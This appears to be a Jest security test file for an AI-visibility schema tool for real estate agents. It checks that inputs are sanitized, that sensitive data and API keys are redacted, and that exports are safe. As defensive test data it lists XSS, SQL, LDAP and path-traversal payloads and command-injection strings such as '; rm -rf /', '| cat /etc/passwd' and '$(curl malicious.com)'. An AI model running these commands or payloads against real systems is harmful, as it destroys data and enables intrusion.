/**
 * AI Visibility Optimization - Security Tests
 * 
 * Tests security measures and data privacy compliance for the AI visibility system.
 * Validates input sanitization, API key management, and data protection.
 * 
 * Requirements: Security and data privacy compliance validation
 */

import { describe, it, expect, beforeEach, afterEach, jest } from '@jest/globals';
import {
  AIVisibilityRepository,
  AISearchMonitorService,
  GeographicSchemaGenerator,
  AdvancedSchemaValidator,
  MultiFormatExportService,
  type SchemaMarkup,
} from '../index';

// Security test data
const MALICIOUS_INPUTS = {
  XSS_PAYLOADS: [
    '<script>alert("xss")</script>',
    '<img src="x" onerror="alert(1)">',
    'javascript:alert("xss")',
    '<svg onload="alert(1)">',
    '"><script>alert("xss")</script>',
    "'; DROP TABLE users; --",
  ],
  SQL_INJECTION: [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1; DELETE FROM users WHERE 1=1; --",
    "admin'--",
    "' UNION SELECT * FROM users --",
  ],
  COMMAND_INJECTION: [
    "; rm -rf /",
    "| cat /etc/passwd",
    "&& curl malicious.com",
    "`rm -rf /`",
    "$(curl malicious.com)",
  ],
  LDAP_INJECTION: [
    "*)(uid=*",
    "*)(|(uid=*))",
    "admin)(&(password=*))",
  ],
  PATH_TRAVERSAL: [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
  ],
};

const SENSITIVE_DATA = {
  SSN: '123-45-6789',
  CREDIT_CARD: '4111-1111-1111-1111',
  API_KEY: 'sk-1234567890abcdef',
  PASSWORD: 'super_secret_password',
  PRIVATE_KEY: '-----BEGIN PRIVATE KEY-----',
  EMAIL: 'sensitive@private.com',
  PHONE: '+1-555-PRIVATE',
};

describe('AI Visibility Optimization - Security Tests', () => {
  let repository: AIVisibilityRepository;
  let aiSearchMonitor: AISearchMonitorService;
  let schemaGenerator: GeographicSchemaGenerator;
  let schemaValidator: AdvancedSchemaValidator;
  let exportService: MultiFormatExportService;

  beforeEach(() => {
    repository = new AIVisibilityRepository();
    aiSearchMonitor = new AISearchMonitorService();
    schemaGenerator = new GeographicSchemaGenerator();
    schemaValidator = new AdvancedSchemaValidator();
    exportService = new MultiFormatExportService();

    // Mock console methods to capture security-related logs
    jest.spyOn(console, 'error').mockImplementation(() => {});
    jest.spyOn(console, 'warn').mockImplementation(() => {});
  });

  afterEach(() => {
    jest.restoreAllMocks();
  });

  describe('Input Sanitization and Validation', () => {
    it('should sanitize XSS payloads in profile data', async () => {
      for (const payload of MALICIOUS_INPUTS.XSS_PAYLOADS) {
        const maliciousProfile = {
          id: 'security-test',
          name: payload,
          email: 'test@example.com',
          bio: `Normal bio with ${payload}`,
          website: payload.includes('javascript:') ? payload : 'https://example.com',
          phone: '+1-555-123-4567',
          certifications: [payload],
          specializations: [`Normal spec with ${payload}`],
          serviceAreas: ['Seattle'],
          address: {
            streetAddress: `123 ${payload} St`,
            addressLocality: 'Seattle',
            addressRegion: 'WA',
            postalCode: '98101',
            addressCountry: 'US',
          },
          socialProfiles: [],
          testimonials: [],
        };

        const schemaMarkup = await schemaGenerator.generateRealEstateAgentSchema(maliciousProfile);
        const schemaString = JSON.stringify(schemaMarkup);

        // Schema should not contain malicious scripts
        expect(schemaString).not.toContain('<script>');
        expect(schemaString).not.toContain('javascript:');
        expect(schemaString).not.toContain('onerror=');
        expect(schemaString).not.toContain('onload=');
        expect(schemaString).not.toContain('<svg');
        expect(schemaString).not.toContain('<img');

        // But should contain sanitized content
        expect(schemaMarkup.name).toBeTruthy();
        expect(schemaMarkup.description).toBeTruthy();
      }
    });

    it('should prevent SQL injection in search queries', async () => {
      for (const payload of MALICIOUS_INPUTS.SQL_INJECTION) {
        const maliciousQuery = {
          query: payload,
          location: 'Seattle',
          agentName: 'Test Agent',
        };

        // Mock the query to check what gets passed through
        const mockQuery = jest.spyOn(aiSearchMonitor, 'queryAIPlatforms').mockResolvedValue([]);

        await aiSearchMonitor.queryAIPlatforms([maliciousQuery]);

        // Verify the query was sanitized or rejected
        const calledWith = mockQuery.mock.calls[0][0][0];
        expect(calledWith.query).not.toContain('DROP TABLE');
        expect(calledWith.query).not.toContain('DELETE FROM');
        expect(calledWith.query).not.toContain('UNION SELECT');
        expect(calledWith.query).not.toContain("'--");
      }
    });

    it('should prevent command injection in export operations', async () => {
      for (const payload of MALICIOUS_INPUTS.COMMAND_INJECTION) {
        const maliciousSchema = {
          '@context': 'https://schema.org',
          '@type': 'RealEstateAgent',
          name: payload,
          description: `Agent with ${payload} in description`,
        };

        const exportPackage = await exportService.exportMultiFormat({
          schemaMarkup: [maliciousSchema],
          format: 'all',
          includeInstructions: true,
        });

        // Check all export formats for command injection
        Object.values(exportPackage.files).forEach(fileContent => {
          expect(fileContent).not.toContain('; rm -rf');
          expect(fileContent).not.toContain('| cat /etc');
          expect(fileContent).not.toContain('&& curl');
          expect(fileContent).not.toContain('`rm -rf');
          expect(fileContent).not.toContain('$(curl');
        });
      }
    });

    it('should prevent path traversal in file operations', async () => {
      for (const payload of MALICIOUS_INPUTS.PATH_TRAVERSAL) {
        const maliciousProfile = {
          id: payload,
          name: 'Test Agent',
          email: 'test@example.com',
          phone: '+1-555-123-4567',
          website: 'https://example.com',
          bio: 'Test bio',
          certifications: [],
          specializations: [],
          serviceAreas: ['Seattle'],
          address: {
            streetAddress: '123 Main St',
            addressLocality: 'Seattle',
            addressRegion: 'WA',
            postalCode: '98101',
            addressCountry: 'US',
          },
          socialProfiles: [],
          testimonials: [],
        };

        // Should not throw errors or access unauthorized files
        const schemaMarkup = await schemaGenerator.generateRealEstateAgentSchema(maliciousProfile);
        expect(schemaMarkup).toBeDefined();

        // ID should be sanitized
        expect(schemaMarkup['@id']).not.toContain('../');
        expect(schemaMarkup['@id']).not.toContain('..\\');
        expect(schemaMarkup['@id']).not.toContain('/etc/passwd');
      }
    });
  });

  describe('Data Privacy and Sensitive Information Protection', () => {
    it('should not expose sensitive data in error messages', async () => {
      const sensitiveProfile = {
        id: 'sensitive-test',
        name: 'Sensitive Agent',
        email: SENSITIVE_DATA.EMAIL,
        phone: SENSITIVE_DATA.PHONE,
        ssn: SENSITIVE_DATA.SSN,
        creditCard: SENSITIVE_DATA.CREDIT_CARD,
        apiKey: SENSITIVE_DATA.API_KEY,
        password: SENSITIVE_DATA.PASSWORD,
        website: 'https://example.com',
        bio: 'Test bio',
        certifications: [],
        specializations: [],
        serviceAreas: ['Seattle'],
        address: {
          streetAddress: '123 Main St',
          addressLocality: 'Seattle',
          addressRegion: 'WA',
          postalCode: '98101',
          addressCountry: 'US',
        },
        socialProfiles: [],
        testimonials: [],
      };

      // Mock a service failure
      jest.spyOn(schemaGenerator, 'generateRealEstateAgentSchema').mockRejectedValue(
        new Error('Processing failed')
      );

      try {
        await schemaGenerator.generateRealEstateAgentSchema(sensitiveProfile);
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        const errorStack = error instanceof Error ? error.stack || '' : '';

        // Error should not contain sensitive information
        Object.values(SENSITIVE_DATA).forEach(sensitiveValue => {
          expect(errorMessage).not.toContain(sensitiveValue);
          expect(errorStack).not.toContain(sensitiveValue);
        });
      }
    });

    it('should redact sensitive data in logs', async () => {
      const sensitiveProfile = {
        id: 'log-test',
        name: 'Log Test Agent',
        email: SENSITIVE_DATA.EMAIL,
        phone: SENSITIVE_DATA.PHONE,
        website: 'https://example.com',
        bio: `Bio with ${SENSITIVE_DATA.SSN} and ${SENSITIVE_DATA.CREDIT_CARD}`,
        certifications: [],
        specializations: [],
        serviceAreas: ['Seattle'],
        address: {
          streetAddress: '123 Main St',
          addressLocality: 'Seattle',
          addressRegion: 'WA',
          postalCode: '98101',
          addressCountry: 'US',
        },
        socialProfiles: [],
        testimonials: [],
      };

      // Capture console output
      const consoleLogs: string[] = [];
      jest.spyOn(console, 'log').mockImplementation((message) => {
        consoleLogs.push(String(message));
      });

      await schemaGenerator.generateRealEstateAgentSchema(sensitiveProfile);

      // Check that logs don't contain sensitive data
      consoleLogs.forEach(log => {
        Object.values(SENSITIVE_DATA).forEach(sensitiveValue => {
          expect(log).not.toContain(sensitiveValue);
        });
      });
    });

    it('should validate data retention policies', async () => {
      const testProfile = {
        id: 'retention-test',
        name: 'Retention Test Agent',
        email: 'retention@test.com',
        phone: '+1-555-123-4567',
        website: 'https://example.com',
        bio: 'Test bio',
        certifications: [],
        specializations: [],
        serviceAreas: ['Seattle'],
        address: {
          streetAddress: '123 Main St',
          addressLocality: 'Seattle',
          addressRegion: 'WA',
          postalCode: '98101',
          addressCountry: 'US',
        },
        socialProfiles: [],
        testimonials: [],
      };

      // Create analysis data
      const analysisId = await repository.createAIVisibilityAnalysis({
        userId: testProfile.id,
        visibilityScore: {
          overall: 75,
          breakdown: {
            schemaMarkup: 80,
            contentOptimization: 70,
            aiSearchPresence: 75,
            knowledgeGraphIntegration: 65,
            socialSignals: 85,
            technicalSEO: 90,
          },
          calculatedAt: new Date(),
          trend: 'improving',
        },
        recommendations: [],
        schemaMarkup: [],
        aiMentions: [],
        websiteAnalysis: null,
        exportPackage: null,
      });

      expect(analysisId).toBeDefined();

      // Verify data can be deleted (for GDPR compliance)
      const deleteResult = await repository.deleteUserData(testProfile.id);
      expect(deleteResult).toBe(true);

      // Verify data is actually deleted
      const retrievedAnalysis = await repository.getAIVisibilityAnalysis(testProfile.id, analysisId);
      expect(retrievedAnalysis).toBeNull();
    });
  });

  describe('API Key and Authentication Security', () => {
    it('should handle missing API keys gracefully', async () => {
      // Mock environment without API keys
      const originalEnv = process.env;
      process.env = { ...originalEnv };
      delete process.env.OPENAI_API_KEY;
      delete process.env.ANTHROPIC_API_KEY;
      delete process.env.GOOGLE_API_KEY;

      try {
        // Services should handle missing API keys without exposing errors
        const mentions = await aiSearchMonitor.queryAIPlatforms([
          {
            query: 'test query',
            location: 'Seattle',
            agentName: 'Test Agent',
          },
        ]);

        // Should return empty results or cached data, not crash
        expect(Array.isArray(mentions)).toBe(true);
      } finally {
        process.env = originalEnv;
      }
    });

    it('should not expose API keys in error messages or logs', async () => {
      const mockApiKey = 'sk-test-api-key-1234567890';
      process.env.OPENAI_API_KEY = mockApiKey;

      // Mock a service failure
      jest.spyOn(aiSearchMonitor, 'queryAIPlatforms').mockRejectedValue(
        new Error('API request failed')
      );

      const consoleLogs: string[] = [];
      jest.spyOn(console, 'error').mockImplementation((message) => {
        consoleLogs.push(String(message));
      });

      try {
        await aiSearchMonitor.queryAIPlatforms([
          {
            query: 'test query',
            location: 'Seattle',
            agentName: 'Test Agent',
          },
        ]);
      } catch (error) {
        const errorMessage = error instanceof Error ? error.message : String(error);
        expect(errorMessage).not.toContain(mockApiKey);
      }

      // Check logs don't contain API key
      consoleLogs.forEach(log => {
        expect(log).not.toContain(mockApiKey);
      });
    });

    it('should implement proper API key rotation handling', async () => {
      const oldApiKey = 'sk-old-key-1234567890';
      const newApiKey = 'sk-new-key-0987654321';

      // Start with old key
      process.env.OPENAI_API_KEY = oldApiKey;

      // Simulate key rotation
      process.env.OPENAI_API_KEY = newApiKey;

      // Service should handle key rotation gracefully
      const mentions = await aiSearchMonitor.queryAIPlatforms([
        {
          query: 'test query after rotation',
          location: 'Seattle',
          agentName: 'Test Agent',
        },
      ]);

      expect(Array.isArray(mentions)).toBe(true);
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should implement rate limiting for API calls', async () => {
      const rapidRequests = 50;
      const startTime = Date.now();

      // Make rapid successive requests
      const promises = Array(rapidRequests).fill(null).map((_, index) =>
        aiSearchMonitor.queryAIPlatforms([
          {
            query: `rapid request ${index}`,
            location: 'Seattle',
            agentName: 'Test Agent',
          },
        ])
      );

      const results = await Promise.all(promises);
      const endTime = Date.now();
      const totalTime = endTime - startTime;

      // Rate limiting should prevent requests from completing too quickly
      expect(totalTime).toBeGreaterThan(100); // At least 100ms for 50 requests
      expect(results).toHaveLength(rapidRequests);

      // Some requests might be throttled or cached
      results.forEach(result => {
        expect(Array.isArray(result)).toBe(true);
      });
    });

    it('should handle resource exhaustion gracefully', async () => {
      // Simulate memory pressure
      const largeDataSets = Array(100).fill(null).map((_, index) => ({
        id: `large-${index}`,
        name: 'A'.repeat(10000), // 10KB name
        bio: 'B'.repeat(50000), // 50KB bio
        certifications: Array(1000).fill(`Cert ${index}`),
        specializations: Array(500).fill(`Spec ${index}`),
        serviceAreas: Array(200).fill(`Area ${index}`),
        testimonials: Array(100).fill(null).map((_, i) => ({
          id: `testimonial-${i}`,
          author: `Author ${i}`,
          rating: 5,
          text: 'C'.repeat(5000), // 5KB per testimonial
          date: '2024-01-01',
        })),
      }));

      // Process should handle large datasets without crashing
      for (const profile of largeDataSets.slice(0, 10)) { // Test with first 10
        const schemaMarkup = await schemaGenerator.generateRealEstateAgentSchema({
          ...profile,
          email: 'test@example.com',
          phone: '+1-555-123-4567',
          website: 'https://example.com',
          address: {
            streetAddress: '123 Main St',
            addressLocality: 'Seattle',
            addressRegion: 'WA',
            postalCode: '98101',
            addressCountry: 'US',
          },
          socialProfiles: [],
        });

        expect(schemaMarkup).toBeDefined();
      }
    });
  });

  describe('Schema Validation Security', () => {
    it('should prevent schema injection attacks', async () => {
      const maliciousSchema = {
        '@context': 'https://schema.org',
        '@type': 'RealEstateAgent',
        name: 'Test Agent',
        'malicious-property': '<script>alert("xss")</script>',
        'another-malicious': 'javascript:alert("xss")',
        '@id': '../../../etc/passwd',
      };

      const validationResult = await schemaValidator.validateSchemaMarkup(maliciousSchema);

      // Validation should catch malicious properties
      expect(validationResult.isValid).toBe(false);
      expect(validationResult.errors.length).toBeGreaterThan(0);

      // Error messages should not contain the malicious content
      const errorMessages = validationResult.errors.map(e => e.message).join(' ');
      expect(errorMessages).not.toContain('<script>');
      expect(errorMessages).not.toContain('javascript:');
    });

    it('should validate schema against known vulnerabilities', async () => {
      const vulnerableSchemas = [
        {
          '@context': 'https://malicious.com/context',
          '@type': 'RealEstateAgent',
          name: 'Test Agent',
        },
        {
          '@context': 'https://schema.org',
          '@type': '../../../etc/passwd',
          name: 'Test Agent',
        },
        {
          '@context': 'https://schema.org',
          '@type': 'RealEstateAgent',
          name: 'Test Agent',
          url: 'javascript:alert("xss")',
        },
      ];

      for (const schema of vulnerableSchemas) {
        const validationResult = await schemaValidator.validateSchemaMarkup(schema);
        
        // Should detect security issues
        expect(validationResult.isValid).toBe(false);
        expect(validationResult.errors.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Export Security', () => {
    it('should sanitize exported data', async () => {
      const maliciousSchema = {
        '@context': 'https://schema.org',
        '@type': 'RealEstateAgent',
        name: '<script>alert("xss")</script>',
        description: 'Agent with <img src="x" onerror="alert(1)"> in description',
        url: 'javascript:alert("xss")',
      };

      const exportPackage = await exportService.exportMultiFormat({
        schemaMarkup: [maliciousSchema],
        format: 'all',
        includeInstructions: true,
      });

      // Check all export formats are sanitized
      Object.entries(exportPackage.files).forEach(([format, content]) => {
        expect(content).not.toContain('<script>');
        expect(content).not.toContain('javascript:');
        expect(content).not.toContain('onerror=');
        expect(content).not.toContain('<img');
        
        // But should contain sanitized content
        expect(content).toContain('RealEstateAgent');
      });
    });

    it('should prevent information disclosure in exports', async () => {
      const sensitiveSchema = {
        '@context': 'https://schema.org',
        '@type': 'RealEstateAgent',
        name: 'Test Agent',
        internalId: SENSITIVE_DATA.SSN,
        apiKey: SENSITIVE_DATA.API_KEY,
        password: SENSITIVE_DATA.PASSWORD,
      };

      const exportPackage = await exportService.exportMultiFormat({
        schemaMarkup: [sensitiveSchema],
        format: 'all',
        includeInstructions: true,
      });

      // Exported data should not contain sensitive information
      Object.values(exportPackage.files).forEach(content => {
        expect(content).not.toContain(SENSITIVE_DATA.SSN);
        expect(content).not.toContain(SENSITIVE_DATA.API_KEY);
        expect(content).not.toContain(SENSITIVE_DATA.PASSWORD);
      });
    });
  });
});